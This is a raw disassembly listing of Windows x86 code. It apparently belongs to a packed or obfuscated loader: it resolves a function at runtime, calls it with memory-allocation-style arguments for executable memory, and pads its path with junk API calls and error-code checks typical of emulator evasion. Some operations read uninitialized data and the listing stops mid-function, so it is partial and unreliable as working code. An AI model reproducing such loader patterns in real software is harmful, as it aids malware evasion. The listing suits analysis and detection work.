0x00401000:	pushl	%ebp	; from: 0x004012fd(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x50, %esp
0x00401006:	movl	$0x0, -80(%ebp)
0x0040100d:	movl	$0x0, -8(%ebp)
0x00401014:	movl	$0x0, -16(%ebp)
0x0040101b:	movl	$0x0, -12(%ebp)
0x00401022:	movl	$0x0, -32(%ebp)
0x00401029:	movl	$0x0, -40(%ebp)
0x00401030:	movl	$0x0, -56(%ebp)
0x00401037:	movl	$0x0, -76(%ebp)
0x0040103e:	movl	$0x0, -24(%ebp)
0x00401045:	movl	$0x0, -52(%ebp)
0x0040104c:	movl	$0x0, -4(%ebp)
0x00401053:	movl	$0x0, -64(%ebp)
0x0040105a:	movl	$0x0, -28(%ebp)
0x00401061:	movl	$0x0, -44(%ebp)
0x00401068:	movl	$0x0, -20(%ebp)
0x0040106f:	movl	$0x0, -60(%ebp)
0x00401076:	movl	$0x0, -72(%ebp)
0x0040107d:	movl	$0x0, -48(%ebp)
0x00401084:	movl	$0x40, -32(%ebp)
0x0040108b:	leal	-32(%ebp), %eax
0x0040108e:	pushl	%eax
0x0040108f:	leal	-16(%ebp), %ecx
0x00401092:	pushl	%ecx
0x00401093:	pushl	$0x4
0x00401095:	call	CopySid@advapi32.dll	; targets: 0xff000080(MAY)
0x0040109b:	testl	%eax, %eax
0x0040109d:	je	0x004010af	; targets: 0x0040109f(MAY), 0x004010af(MAY)
0x0040109f:	pushl	$0x3	; from: 0x0040109d(MAY)
0x004010a1:	pushl	$0x0
0x004010a3:	pushl	$0x2
0x004010a5:	pushl	$0x1
0x004010a7:	pushl	$0x0
0x004010a9:	call	AddAce@advapi32.dll	; targets: 0xff0000a0(MAY)
0x004010af:	call	GetLastError@kernel32.dll	; targets: 0xff000050(MAY)	; from: 0x0040109d(MAY)
0x004010b5:	movl	%eax, -28(%ebp)
0x004010b8:	movzwl	-28(%ebp), %edx
0x004010bc:	cmpl	$0x7a, %edx
0x004010bf:	jne	0x004010df	; targets: 0x004010c1(MAY), 0x004010df(MAY)
0x004010c1:	movl	$0xe0d, -24(%ebp)	; from: 0x004010bf(MAY)
0x004010c8:	movl	$0x3a, -52(%ebp)
0x004010cf:	movl	$0x6ac33384, -8(%ebp)
0x004010d6:	movl	$0xdfd5f, -72(%ebp)
0x004010dd:	jmp	0x00401109	; targets: 0x00401109(MAY)
0x004010df:	pushl	$0x402830	; from: 0x004010bf(MAY)
0x004010e4:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000110(MAY)
0x004010ea:	movl	%eax, -28(%ebp)
0x004010ed:	pushl	$0x404f40
0x004010f2:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000110(MAY)
0x004010f8:	movl	%eax, -28(%ebp)
0x004010fb:	pushl	$0x402060
0x00401100:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000110(MAY)
0x00401106:	movl	%eax, -28(%ebp)
0x00401109:	pushl	$0x0	; from: 0x004010dd(MAY)
0x0040110b:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000110(MAY)
0x00401111:	movl	%eax, -28(%ebp)
0x00401114:	movl	$0xffffffff, -64(%ebp)
0x0040111b:	pushl	GetModuleHandleA@kernel32.dll
0x00401121:	popl	%edx
0x00401122:	movl	%edx, -76(%ebp)
0x00401125:	pushl	$0x64
0x00401127:	pushl	$0x0
0x00401129:	call	WaitForSingleObject@kernel32.dll	; targets: 0xff0000b0(MAY)
0x0040112f:	pushl	$0x434e60
0x00401134:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000110(MAY)
0x0040113a:	movl	%eax, -64(%ebp)
0x0040113d:	pushl	$0x434e70
0x00401142:	movl	-64(%ebp), %eax
0x00401145:	pushl	%eax
0x00401146:	call	GetProcAddress@kernel32.dll	; targets: 0xff0000d0(MAY)
0x0040114c:	movl	%eax, -36(%ebp)
0x0040114f:	movl	-32(%ebp), %ecx
0x00401152:	pushl	%ecx
0x00401153:	pushl	$0x1000
0x00401158:	movl	-24(%ebp), %edx
0x0040115b:	addl	$0x14, %edx
0x0040115e:	pushl	%edx
0x0040115f:	pushl	$0x0
0x00401161:	pushl	$0xffffffff
0x00401163:	call	-36(%ebp)	; targets: unresolved

start:
0x00401201:	pushl	%ebp
0x00401202:	movl	%esp, %ebp
0x00401204:	subl	$0x2c, %esp
0x00401207:	movl	$0x0, -12(%ebp)
0x0040120e:	movl	$0x0, -40(%ebp)
0x00401215:	movl	$0x0, -20(%ebp)
0x0040121c:	movl	$0x0, -4(%ebp)
0x00401223:	pushl	$0x8
0x00401225:	leal	-8(%ebp), %eax
0x00401228:	pushl	%eax
0x00401229:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff0000c0(MAY)
0x0040122f:	leal	-36(%ebp), %ecx
0x00401232:	pushl	%ecx
0x00401233:	call	GetSystemTime@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00401239:	movl	-12(%ebp), %edx
0x0040123c:	pushl	%edx
0x0040123d:	call	0x00401282	; targets: 0x00401282(MAY)
0x00401242:	addl	$0x4, %esp	; from: 0x00401315(MAY)
0x00401245:	call	0x00401316	; targets: 0x00401316(MAY)
0x00401282:	pushl	%ebp	; from: 0x0040123d(MAY)
0x00401283:	movl	%esp, %ebp
0x00401285:	subl	$0x3c, %esp
0x00401288:	pushl	%esi
0x00401289:	movl	$0x0, -60(%ebp)
0x00401290:	movl	$0x0, -56(%ebp)
0x00401297:	movl	$0x0, -28(%ebp)
0x0040129e:	movl	$0x0, -48(%ebp)
0x004012a5:	movl	$0x0, -36(%ebp)
0x004012ac:	movl	$0x0, -40(%ebp)
0x004012b3:	movl	$0x434e80, -44(%ebp)
0x004012ba:	movl	$0x499a0a51, -36(%ebp)
0x004012c1:	movl	$0x0, -52(%ebp)
0x004012c8:	movl	-36(%ebp), %eax
0x004012cb:	movl	%eax, -32(%ebp)
0x004012ce:	movl	GetLastError@kernel32.dll, %ecx
0x004012d4:	movl	%ecx, -4(%ebp)
0x004012d7:	pushl	$0x8000
0x004012dc:	pushl	$0x0
0x004012de:	movl	-60(%ebp), %edx
0x004012e1:	pushl	%edx
0x004012e2:	call	VirtualFree@kernel32.dll	; targets: 0xff000070(MAY)
0x004012e8:	movl	-4(%ebp), %esi
0x004012eb:	call	%esi	; targets: 0xff000050(MAY)
0x004012ed:	movl	%eax, -60(%ebp)
0x004012f0:	cmpl	$0x1e7, -60(%ebp)
0x004012f7:	jne	0x0040130f	; targets: 0x0040130f(MAY), 0x004012f9(MAY)
0x004012f9:	movl	-32(%ebp), %eax	; from: 0x004012f7(MAY)
0x004012fc:	pushl	%eax
0x004012fd:	call	0x00401000	; targets: 0x00401000(MAY)
0x0040130f:	xorl	%eax, %eax	; from: 0x004012f7(MAY)
0x00401311:	popl	%esi
0x00401312:	movl	%ebp, %esp
0x00401314:	popl	%ebp
0x00401315:	ret	; targets: 0x00401242(MAY)

0x00401316:	pushl	%ebp	; from: 0x00401245(MAY)
0x00401317:	movl	%esp, %ebp
0x00401319:	subl	$0x128, %esp
0x0040131f:	movl	-252(%ebp), %eax
0x00401325:	addl	-244(%ebp), %eax
0x0040132b:	movl	%eax, -8(%ebp)
0x0040132e:	movl	-8(%ebp), %ecx
0x00401331:	movl	(%ecx), %edx
0x00401333:	movl	%edx, -4(%ebp)
0x00401336:	movl	-4(%ebp), %eax
0x00401339:	shll	$0x2, %eax
0x0040133c:	cmpl	$0x21c00, %eax
0x00401341:	jne	0x0040134f	; targets: 0x0040134f(MAY), 0x00401343(MAY)
0x00401343:	movl	$0x434e9c, -296(%ebp)	; from: 0x00401341(MAY)
0x0040134d:	jmp	0x00401359	; targets: 0x00401359(MAY)
0x0040134f:	movl	$0x434ea0, -296(%ebp)	; from: 0x00401341(MAY)
0x00401359:	movl	-296(%ebp), %ecx	; from: 0x0040134d(MAY)
0x0040135f:	pushl	%ecx
0x00401360:	movl	-4(%ebp), %edx
0x00401363:	pushl	%edx
0x00401364:	pushl	$0x434ea8
0x00401369:	leal	-216(%ebp), %eax
0x0040136f:	pushl	%eax
0x00401370:	call	wsprintfA@user32.dll	; targets: 0xff000040(MAY)
0x00401376:	addl	$0x10, %esp
0x00401379:	leal	-216(%ebp), %ecx
0x0040137f:	pushl	%ecx
0x00401380:	call	lstrlenA@kernel32.dll	; targets: 0xff0000f0(MAY)
0x00401386:	movl	-252(%ebp), %edx
0x0040138c:	pushl	%edx
0x0040138d:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000020(MAY)
0x00401393:	movl	%eax, -16(%ebp)
0x00401396:	movl	-248(%ebp), %eax
0x0040139c:	pushl	%eax
0x0040139d:	call	CloseHandle@kernel32.dll	; targets: 0xff000010(MAY)
0x004013a3:	movl	%eax, -16(%ebp)
0x004013a6:	movl	-240(%ebp), %ecx
0x004013ac:	pushl	%ecx
0x004013ad:	call	CloseHandle@kernel32.dll	; targets: 0xff000010(MAY)
0x004013b3:	movl	%eax, -16(%ebp)
0x004013b6:	cmpl	$0x0, -16(%ebp)
0x004013ba:	jne	0x004013d8	; targets: 0x004013bc(MAY), 0x004013d8(MAY)
0x004013bc:	call	GetLastError@kernel32.dll	; targets: unresolved	; from: 0x004013ba(MAY)
0x004013d8:	xorl	%eax, %eax	; from: 0x004013ba(MAY)
